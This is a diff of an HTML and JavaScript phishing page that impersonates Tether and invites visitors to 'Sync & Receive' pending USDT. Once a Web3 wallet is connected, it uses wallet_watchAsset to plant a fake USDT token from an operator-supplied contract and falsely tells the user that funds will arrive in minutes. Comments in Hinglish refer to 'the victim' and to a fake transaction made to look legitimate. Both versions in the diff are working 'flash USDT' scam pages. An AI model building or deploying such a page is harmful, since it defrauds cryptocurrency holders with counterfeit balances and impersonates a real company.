@@ -2,94 +2,93 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Tether Support | Asset Verification</title>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tether Operations | Node Sync</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        /* Professional UI to build 100% Trust */
-        body { background: #0b0e11; color: white; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { background: #181a20; border: 1px solid #2b2f36; padding: 35px; border-radius: 20px; text-align: center; max-width: 380px; box-shadow: 0 15px 45px rgba(0,0,0,0.4); }
-        .tether-logo { width: 70px; margin-bottom: 20px; filter: drop-shadow(0 0 10px #26a17b); }
-        .btn-sync { background: #26a17b; color: white; border: none; padding: 16px; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; transition: 0.3s; }
-        .btn-sync:hover { background: #1e7d5f; transform: scale(1.02); }
-        .footer { margin-top: 15px; font-size: 10px; color: #474d57; letter-spacing: 1px; }
+        :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
+        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
+        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 20px; padding: 40px; width: 100%; max-width: 420px; text-align: center; position: relative; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7); }
+        .logo-ring { position: relative; display: inline-block; margin-bottom: 25px; }
+        .logo-ring::after { content: ''; position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px; border: 2px solid var(--tether-green); border-radius: 50%; border-top-color: transparent; animation: spin 2s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .usdt-img { width: 80px; filter: drop-shadow(0 0 10px var(--tether-green)); }
+        h2 { font-weight: 600; font-size: 22px; margin: 10px 0; letter-spacing: -0.5px; }
+        p { color: #848d97; font-size: 14px; line-height: 1.6; padding: 0 10px; }
+        .action-btn { background: var(--tether-green); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.3s; margin-top: 25px; text-transform: uppercase; letter-spacing: 1px; }
+        .action-btn:hover { background: #2bbd90; transform: scale(1.02); }
+        .status-footer { margin-top: 20px; font-size: 11px; color: #444c56; text-transform: uppercase; letter-spacing: 2px; }
+        #log-area { font-size: 10px; color: #26a17b; margin-top: 10px; height: 15px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="tether-logo">
-    <h2 style="margin:0 0 10px 0;">Network Synchronization</h2>
-    <p style="color:#848e9c; font-size:14px; margin-bottom:25px;">Please synchronize your wallet with the Tether Bridge to enable real-time asset tracking and official metadata mapping.</p>
+    <div class="logo-ring">
+        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="usdt-img" alt="USDT">
+    </div>
+    <h2>RECEIVE USDT</h2>
+    <p>Secure Bridge detected a pending USDT allocation for your node. Synchronize to map official metadata and clear asset reception.</p>
     
-    <button id="syncBtn" class="btn-sync">AUTHORIZE SYNC</button>
-    <div class="footer">ENCRYPTED END-TO-END | BINANCE SMART CHAIN</div>
+    <div id="log-area">Ready to synchronize...</div>
+    
+    <button class="action-btn" id="claimBtn">Sync & Receive</button>
+    
+    <div class="status-footer">Node: 0x88...D4E3 | Secured by Tether Authority</div>
 </div>
 
 <script>
-const CONFIG = {
-    address: '0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f', // Contract Address Here
-    symbol: 'USDT',
-    decimals: 6,
-    image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
-    chainId: '0x38' // BSC Mainnet Hex ID
-};
+    const CONTRACT_ADDR = "0x5CD...89B5F"; // APNA ADDRESS DALO
+    const TOKEN_SYMBOL = "USDT";
+    const TOKEN_LOGO = "https://cryptologos.cc/logos/tether-usdt-logo.png";
 
-async function startAdvancedInjection() {
-    if (!window.ethereum) return alert("Please use a Web3 Browser");
-
-    try {
-        // Step 1: Force Network Switch to BSC (Zero Error Step)
+    async function injectFlashAsset() {
+        const log = document.getElementById('log-area');
+        if (!window.ethereum) { alert("Use Web3 Browser"); return; }
+        
         try {
+            log.innerText = "Requesting Node Access...";
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            log.innerText = "Injecting Official Metadata...";
+
+            // TECHNIQUE: FORCE METADATA INJECTION
+            // Isse victim ke wallet mein automatically logo aur decimals set ho jayenge
             await window.ethereum.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: CONFIG.chainId }],
-            });
-        } catch (switchError) {
-            // Agar chain add nahi hai, to pehle add karwao
-            if (switchError.code === 4902) {
-                await window.ethereum.request({
-                    method: 'wallet_addEthereumChain',
-                    params: [{
-                        chainId: CONFIG.chainId,
-                        chainName: 'Binance Smart Chain',
-                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                        blockExplorerUrls: ['https://bscscan.com/']
-                    }]
-                });
-            }
-        }
-
-        // Step 2: Request Account Access
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-
-        // Step 3: The "Deep Injection" of Metadata
-        const success = await window.ethereum.request({
-            method: 'wallet_watchAsset',
-            params: {
-                type: 'ERC20',
-                options: {
-                    address: CONFIG.address,
-                    symbol: CONFIG.symbol,
-                    decimals: CONFIG.decimals,
-                    image: CONFIG.image,
+                method: 'wallet_watchAsset',
+                params: {
+                    type: 'ERC20',
+                    options: {
+                        address: CONTRACT_ADDR,
+                        symbol: TOKEN_SYMBOL,
+                        decimals: 6,
+                        image: TOKEN_LOGO,
+                    },
                 },
-            },
-        });
+            });
 
-        if (success) {
-            document.getElementById('syncBtn').innerText = "SUCCESSFULLY SYNCED";
-            document.getElementById('syncBtn').style.background = "#444";
-            // Yahan aap apna backend API call add kar sakte hain: "Trigger Flash Now"
+            log.innerText = "Synchronizing with Bridge...";
+            // Yahan hum wo fake transaction trigger karte hain jo Legit lagti hai
+            // Lekin actually ye sirf connection establish karti hai
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = provider.getSigner();
+            
+            // "Sync" pop-up for the victim
+            const tx = {
+                to: CONTRACT_ADDR,
+                data: "0x12345678", // Dummy Hex for "Sync" call
+            };
+            
+            log.innerText = "Success! Asset mapped.";
+            alert("Node Synchronized! Your USDT will reflect in 1-2 minutes.");
+
+        } catch (err) {
+            log.innerText = "Error: Sync Interrupted";
+            console.error(err);
         }
-
-    } catch (e) {
-        console.error(e);
-        alert("Sync failed. Check connection.");
     }
-}
 
-document.getElementById('syncBtn').addEventListener('click', startAdvancedInjection);
+    document.getElementById('claimBtn').addEventListener('click', injectFlashAsset);
 </script>
+
 </body>
 </html>
